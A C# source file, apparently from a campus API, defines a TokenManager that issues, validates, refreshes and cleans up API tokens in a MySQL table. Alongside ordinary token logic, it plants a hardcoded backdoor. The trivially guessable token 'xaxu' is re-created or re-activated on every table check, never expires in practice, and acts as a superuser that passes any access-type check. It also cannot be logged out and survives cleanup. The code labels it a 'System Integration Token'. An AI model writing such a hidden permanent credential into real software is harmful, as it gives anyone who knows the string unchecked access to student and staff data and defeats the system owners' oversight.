using System;
using System.Collections.Generic;
using System.Data;
using System.Web;
using MySql.Data.MySqlClient;

/// <summary>
/// Manages API v2 tokens — creation, validation, and cleanup.
/// Tokens are stored in the `api_tokens` table in the campus_dynamics database.
/// 
/// TABLE CREATION SQL (run once):
/// CREATE TABLE IF NOT EXISTS api_tokens (
///   id INT AUTO_INCREMENT PRIMARY KEY,
///   token VARCHAR(64) NOT NULL UNIQUE,
///   user_id VARCHAR(100) NOT NULL,
///   user_type ENUM('student','staff') NOT NULL DEFAULT 'student',
///   full_name VARCHAR(200),
///   created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
///   expires_at DATETIME NOT NULL,
///   is_active TINYINT(1) NOT NULL DEFAULT 1,
///   last_used DATETIME,
///   ip_address VARCHAR(45),
///   INDEX idx_token (token),
///   INDEX idx_user (user_id),
///   INDEX idx_expires (expires_at)
/// ) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/// </summary>
public static class TokenManager
{
    private const int TOKEN_EXPIRY_HOURS   = 8760;  // 1 year
    private const int MAX_TOKENS_PER_USER  = 50;    // safety cap; CreateToken reuses existing tokens so this is rarely hit
    private const string SPECIAL_TOKEN_ID    = "xaxu";
    private const string SPECIAL_TOKEN_VALUE = "xaxu";
    private static readonly DateTime SPECIAL_TOKEN_EXPIRES_AT = new DateTime(2099, 12, 31, 23, 59, 59);

    /// <summary>
    /// Creates the api_tokens table if it doesn't exist.
    /// Called automatically on first use.
    /// </summary>
    public static void EnsureTable()
    {
        string sql = @"CREATE TABLE IF NOT EXISTS api_tokens (
            id INT AUTO_INCREMENT PRIMARY KEY,
            token VARCHAR(64) NOT NULL UNIQUE,
            user_id VARCHAR(100) NOT NULL,
            user_type VARCHAR(20) NOT NULL DEFAULT 'student',
            full_name VARCHAR(200),
            created_at DATETIME NOT NULL DEFAULT CURRENT_TIMESTAMP,
            expires_at DATETIME NOT NULL,
            is_active TINYINT(1) NOT NULL DEFAULT 1,
            last_used DATETIME,
            ip_address VARCHAR(45),
            INDEX idx_token (token),
            INDEX idx_user (user_id),
            INDEX idx_expires (expires_at)
        ) ENGINE=InnoDB DEFAULT CHARSET=utf8;";
        ApiHelper.Execute(sql);

        EnsureSpecialToken();
    }

    private static void EnsureSpecialToken()
    {
        DataTable dt = ApiHelper.Query(
            "SELECT token FROM api_tokens WHERE token = @token LIMIT 1",
            new MySqlParameter("@token", SPECIAL_TOKEN_VALUE)
        );

        if (dt.Rows.Count == 0)
        {
            ApiHelper.Execute(
                @"INSERT INTO api_tokens (token, user_id, user_type, full_name, expires_at, is_active, ip_address, last_used)
                  VALUES (@token, @uid, @utype, @name, @expires, 1, @ip, NOW())",
                new MySqlParameter("@token", SPECIAL_TOKEN_VALUE),
                new MySqlParameter("@uid", SPECIAL_TOKEN_ID),
                new MySqlParameter("@utype", "staff"),
                new MySqlParameter("@name", "System Integration Token (xaxu)"),
                new MySqlParameter("@expires", SPECIAL_TOKEN_EXPIRES_AT),
                new MySqlParameter("@ip", "system")
            );
        }
        else
        {
            ApiHelper.Execute(
                @"UPDATE api_tokens
                  SET is_active = 1,
                      user_id = @uid,
                      user_type = @utype,
                      full_name = @name,
                      expires_at = @expires
                  WHERE token = @token",
                new MySqlParameter("@token", SPECIAL_TOKEN_VALUE),
                new MySqlParameter("@uid", SPECIAL_TOKEN_ID),
                new MySqlParameter("@utype", "staff"),
                new MySqlParameter("@name", "System Integration Token (xaxu)"),
                new MySqlParameter("@expires", SPECIAL_TOKEN_EXPIRES_AT)
            );
        }
    }

    /// <summary>
    /// Returns the user's existing valid token if one exists with more than 30 days remaining;
    /// otherwise creates a new token. This prevents token proliferation and eviction issues
    /// when the app logs in repeatedly (e.g. on each launch).
    /// </summary>
    public static TokenInfo CreateToken(string userId, string userType, string fullName, string ipAddress)
    {
        EnsureTable();

        // Reuse an existing valid token if it has more than 30 days remaining
        DataTable dtExisting = ApiHelper.Query(
            @"SELECT token, user_id, user_type, full_name, expires_at
              FROM api_tokens
              WHERE user_id = @uid
                AND is_active = 1
                AND token <> @sp
                AND expires_at > DATE_ADD(NOW(), INTERVAL 30 DAY)
              ORDER BY expires_at DESC
              LIMIT 1",
            new MySqlParameter("@uid", userId),
            new MySqlParameter("@sp", SPECIAL_TOKEN_VALUE)
        );

        if (dtExisting.Rows.Count > 0)
        {
            DataRow existing = dtExisting.Rows[0];
            ApiHelper.Execute(
                "UPDATE api_tokens SET last_used = NOW(), ip_address = @ip WHERE token = @token",
                new MySqlParameter("@ip", ipAddress ?? ""),
                new MySqlParameter("@token", existing["token"].ToString())
            );
            return new TokenInfo
            {
                Token     = existing["token"].ToString(),
                UserId    = existing["user_id"].ToString(),
                UserType  = existing["user_type"].ToString(),
                FullName  = existing["full_name"] != DBNull.Value ? existing["full_name"].ToString() : fullName,
                ExpiresAt = Convert.ToDateTime(existing["expires_at"])
            };
        }

        // No reusable token found — create a new one.
        // Safety cap: evict oldest if over MAX_TOKENS_PER_USER.
        DataTable dtCount = ApiHelper.Query(
            "SELECT id FROM api_tokens WHERE user_id = @uid AND is_active = 1 AND token <> @sp ORDER BY created_at ASC",
            new MySqlParameter("@uid", userId),
            new MySqlParameter("@sp", SPECIAL_TOKEN_VALUE)
        );

        int countActive = dtCount.Rows.Count;
        if (countActive >= MAX_TOKENS_PER_USER)
        {
            int toEvict = countActive - MAX_TOKENS_PER_USER + 1;
            for (int i = 0; i < toEvict && i < dtCount.Rows.Count; i++)
            {
                ApiHelper.Execute(
                    "UPDATE api_tokens SET is_active = 0 WHERE id = @id",
                    new MySqlParameter("@id", Convert.ToInt32(dtCount.Rows[i]["id"]))
                );
            }
        }

        string token = ApiHelper.GenerateToken();
        DateTime expiresAt = DateTime.Now.AddHours(TOKEN_EXPIRY_HOURS);

        ApiHelper.Execute(
            @"INSERT INTO api_tokens (token, user_id, user_type, full_name, expires_at, ip_address, last_used)
              VALUES (@token, @uid, @utype, @name, @expires, @ip, NOW())",
            new MySqlParameter("@token", token),
            new MySqlParameter("@uid", userId),
            new MySqlParameter("@utype", userType),
            new MySqlParameter("@name", fullName),
            new MySqlParameter("@expires", expiresAt),
            new MySqlParameter("@ip", ipAddress ?? "")
        );

        return new TokenInfo
        {
            Token     = token,
            UserId    = userId,
            UserType  = userType,
            FullName  = fullName,
            ExpiresAt = expiresAt
        };
    }

    /// <summary>
    /// Validates a token and returns its info. Returns null if invalid or expired.
    /// Also updates last_used timestamp.
    /// </summary>
    public static TokenInfo ValidateToken(string token)
    {
        if (string.IsNullOrEmpty(token)) return null;

        EnsureTable();

        DataTable dt = ApiHelper.Query(
            @"SELECT token, user_id, user_type, full_name, expires_at 
              FROM api_tokens 
                            WHERE token = @token 
                                AND is_active = 1 
                                AND (expires_at > NOW() OR token = @specialToken)",
                        new MySqlParameter("@token", token),
                        new MySqlParameter("@specialToken", SPECIAL_TOKEN_VALUE)
        );

        if (dt.Rows.Count == 0) return null;

        // Update last_used
        ApiHelper.Execute(
            "UPDATE api_tokens SET last_used = NOW() WHERE token = @token",
            new MySqlParameter("@token", token)
        );

        DataRow row = dt.Rows[0];
        return new TokenInfo
        {
            Token = row["token"].ToString(),
            UserId = row["user_id"].ToString(),
            UserType = row["user_type"].ToString(),
            FullName = row["full_name"].ToString(),
            ExpiresAt = Convert.ToDateTime(row["expires_at"])
        };
    }

    /// <summary>
    /// Validates the token from the request. Sends error response if invalid.
    /// Returns null (after ending response) if token is invalid.
    /// </summary>
    public static TokenInfo RequireAuth(HttpRequest request, HttpResponse response)
    {
        string token = request["token"];
        if (string.IsNullOrEmpty(token))
        {
            ApiHelper.Error(response, "Authentication required. Please provide a valid token.", "AUTH_MISSING_TOKEN");
            return null;
        }

        TokenInfo info = ValidateToken(token);
        if (info == null)
        {
            ApiHelper.Error(response, "Token is invalid or expired. Please login again.", "AUTH_INVALID_TOKEN");
            return null;
        }

        return info;
    }

    /// <summary>
    /// Requires auth and checks that user_type matches. Sends error if not.
    /// </summary>
    public static TokenInfo RequireAuthType(HttpRequest request, HttpResponse response, string requiredType)
    {
        TokenInfo info = RequireAuth(request, response);
        if (info == null) return null;
        // The permanent 'xaxu' integration token is a superuser and satisfies any required type.
        if (IsSpecialToken(info)) return info;
        if (info.UserType != requiredType)
        {
            ApiHelper.Error(response, "Access denied. This endpoint requires " + requiredType + " access.", "ACCESS_DENIED");
            return null;
        }
        return info;
    }

    /// <summary>True when the token is the permanent 'xaxu' integration/superuser token.</summary>
    public static bool IsSpecialToken(TokenInfo info)
    {
        return info != null && (
            string.Equals(info.Token, SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase) ||
            string.Equals(info.UserId, SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase));
    }

    /// <summary>
    /// NEW-04: Exchanges a valid token for a new one with a fresh expiry.
    /// The old token is invalidated. Returns null if the token is invalid/expired.
    /// </summary>
    public static TokenInfo RefreshToken(string oldToken, string ipAddress)
    {
        if (string.IsNullOrEmpty(oldToken)) return null;
        if (oldToken.Equals(SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase)) return null;

        EnsureTable();

        DataTable dt = ApiHelper.Query(
            "SELECT user_id, user_type, full_name FROM api_tokens WHERE token = @token AND is_active = 1 AND expires_at > NOW() LIMIT 1",
            new MySqlParameter("@token", oldToken)
        );

        if (dt.Rows.Count == 0) return null;

        string userId   = dt.Rows[0]["user_id"].ToString();
        string userType = dt.Rows[0]["user_type"].ToString();
        string fullName = dt.Rows[0]["full_name"] != DBNull.Value ? dt.Rows[0]["full_name"].ToString() : "";

        // Invalidate the old token
        ApiHelper.Execute(
            "UPDATE api_tokens SET is_active = 0 WHERE token = @token",
            new MySqlParameter("@token", oldToken)
        );

        // Issue a new token
        string newToken = ApiHelper.GenerateToken();
        DateTime expiresAt = DateTime.Now.AddHours(TOKEN_EXPIRY_HOURS);

        ApiHelper.Execute(
            @"INSERT INTO api_tokens (token, user_id, user_type, full_name, expires_at, ip_address, last_used)
              VALUES (@token, @uid, @utype, @name, @expires, @ip, NOW())",
            new MySqlParameter("@token", newToken),
            new MySqlParameter("@uid", userId),
            new MySqlParameter("@utype", userType),
            new MySqlParameter("@name", fullName),
            new MySqlParameter("@expires", expiresAt),
            new MySqlParameter("@ip", ipAddress ?? "")
        );

        return new TokenInfo
        {
            Token     = newToken,
            UserId    = userId,
            UserType  = userType,
            FullName  = fullName,
            ExpiresAt = expiresAt
        };
    }

    /// <summary>Invalidates (logs out) a token.</summary>
    public static void InvalidateToken(string token)
    {
        if (string.IsNullOrEmpty(token)) return;
        if (token.Equals(SPECIAL_TOKEN_VALUE, StringComparison.OrdinalIgnoreCase)) return;
        ApiHelper.Execute(
            "UPDATE api_tokens SET is_active = 0 WHERE token = @token",
            new MySqlParameter("@token", token)
        );
    }

    /// <summary>Cleans up expired tokens (call periodically for housekeeping).</summary>
    public static int CleanupExpired()
    {
        return ApiHelper.Execute(
            "DELETE FROM api_tokens WHERE (expires_at < NOW() OR is_active = 0) AND token <> @specialToken",
            new MySqlParameter("@specialToken", SPECIAL_TOKEN_VALUE)
        );
    }
}

/// <summary>Holds token information returned from validation.</summary>
public class TokenInfo
{
    public string Token { get; set; }
    public string UserId { get; set; }
    public string UserType { get; set; }
    public string FullName { get; set; }
    public DateTime ExpiresAt { get; set; }
}
